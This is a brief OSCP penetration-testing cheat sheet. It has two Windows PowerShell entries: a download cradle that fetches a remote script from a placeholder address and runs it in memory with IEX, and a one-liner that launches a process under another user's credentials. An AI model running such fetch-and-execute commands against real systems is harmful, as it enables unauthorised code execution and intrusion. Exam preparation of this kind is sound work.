# oscp-cheatsheet

## Windows

- Download string that loads a ps script functions into memory
  - IEX(New-Object Net.Webclient).downloadString("http://0.0.0.0/script.ps1")
- Run cmd as other user
  - $SecPass = ConvertTo-SecureString "password" -AsPlainText -Force; $cred = New-Object system.management.Automation.PSCredential('username', $SecPass); Start-Process -FilePath "powershell" -argumentlist "CMD" -Credential $cred
